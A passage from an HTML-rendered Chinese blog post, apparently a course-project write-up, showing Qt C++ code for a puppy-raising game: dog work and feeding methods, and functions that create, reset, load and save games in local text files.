class="hljs-string">&quot;小狗将出门打工一小时，记得奖励小狗哦！\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗很累，快为小狗补充体力吧！\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;经验不足被老板劝退了，去做家务增加经验吧！\n&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br>SmallDog::<span class="hljs-built_in">SmallDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += food;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    QString message=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗将出门打工一小时，记得奖励小狗哦！\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;小狗很累，快为小狗补充体力吧！\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span class="hljs-string">&quot;经验不足被老板劝退了，去做家务增加经验吧！\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-2-部分功能介绍"><a href="#5-2-部分功能介绍" class="headerlink" title="5.2 部分功能介绍"></a>5.2 部分功能介绍</h4><h5 id="读档存档"><a href="#读档存档" class="headerlink" title="读档存档"></a>读档存档</h5><p>利用TXT文件的读写实现存档功能</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-comment">//-------------------------读档存档界面-----------------------------</span><br><span class="hljs-comment">//初始载入存档名称</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::InitialRecord</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);    <span class="hljs-comment">//save1是图形化界面中组件的名字，下同</span><br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//重置存档</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ResetRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;.../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fwrite</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fwrite.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);  <span class="hljs-comment">//对存档文件进行只写操作写入空存档标志 !@#$%^</span><br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fwrite)</span></span>;<br>        QString s=<span class="hljs-string">&quot;!@#$%^&quot;</span>;<br>        ds &lt;&lt; <span class="hljs-built_in">QString</span>(s);<br>    &#125;<br><br>    pSave-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>    pRead-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br><br>    Fwrite.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//读档</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ReadRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;提示&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;确定选择该存档?&lt;/h3&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-keyword">if</span>(pSave-&gt;<span class="hljs-built_in">text</span>()==<span class="hljs-string">&quot;新建家庭&quot;</span>)<br>    &#123;<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>        <span class="hljs-keyword">if</span>(isExist)<br>        &#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString tmp=<span class="hljs-string">&quot;&quot;</span>;<br>            Family family;<br>            <span class="hljs-comment">//初始化家庭</span><br><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            Demo.dogs.<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-built_in">InitialStore</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br>            <span class="hljs-comment">//家庭信息</span><br>            <span class="hljs-keyword">while</span>(tmp==<span class="hljs-string">&quot;&quot;</span>)<br>            &#123;<br>                tmp=QInputDialog::<span class="hljs-built_in">getText</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;提示&quot;</span>,<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;&lt;h3&gt;请给小家起个名字吧：&lt;/h3&gt;&quot;</span>));<br>            &#125;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(tmp);<br>            ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>            pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>            pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br><br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(<span class="hljs-number">30</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(<span class="hljs-number">5</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br><br>            QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;新建家庭成功&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;快去领养一只狗狗吧！&lt;/h3&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">InitInformation</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;读档成功&quot;</span>,<span class="hljs-string">&quot;快回家看看小狗吧~&quot;</span>);<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>        <span class="hljs-keyword">if</span>(isExist)&#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString itmp,jtmp,ktmp,stmp;<br><br>            <span class="hljs-comment">//初始化</span><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br><br>            <span class="hljs-comment">//家庭信息</span><br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveBonse</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveDogfood</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveMedicine</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setPlayerTime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.member=stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>();<br><br>            <span class="hljs-comment">//狗狗信息</span><br>            Dog *dogTmp;  <span class="hljs-comment">// 在 if-else 结构之前声明</span><br><br>            ds &gt;&gt; itmp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; itmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>(); j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (Demo.member &gt; <span class="hljs-number">4</span>) &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BigDog</span>();  <span class="hljs-comment">// 初始化变量</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SmallDog</span>();  <span class="hljs-comment">// 初始化变量</span><br>                &#125;<br><br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogName</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogAbility</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogEnergy</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toDouble</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogIll</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogState</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogWorktime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                Demo.dogs.<span class="hljs-built_in">push_back</span>(dogTmp);<br><br>            &#125;<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    haveLoadGame=<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">renovate</span>();<br>    <span class="hljs-built_in">InitialHome</span>();<br><br>    ui-&gt;stackedWidget-&gt;<span class="hljs-built_in">setCurrentWidget</span>(ui-&gt;home);<br><br>    <span class="hljs-comment">//禁用/启用按钮</span><br>    <span class="hljs-keyword">if</span>(haveLoadGame==<span class="hljs-number">0</span>)&#123;<br>        ui-&gt;pushButton_newmember-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_gotostore-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_honor-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        ui-&gt;pushButton_save-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//存档</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::SaveRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;提示&quot;</span>,<span class="hljs-string">&quot;确定覆盖存档?&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>    <span class="hljs-keyword">if</span>(isExist)<br>    &#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        <br><span class="hljs-comment">//按顺序存储关键信息，读档顺序需和存档顺序一致</span><br>        <br>        <span class="hljs-comment">//家庭信息</span><br>        ds&lt;&lt;Demo.<span 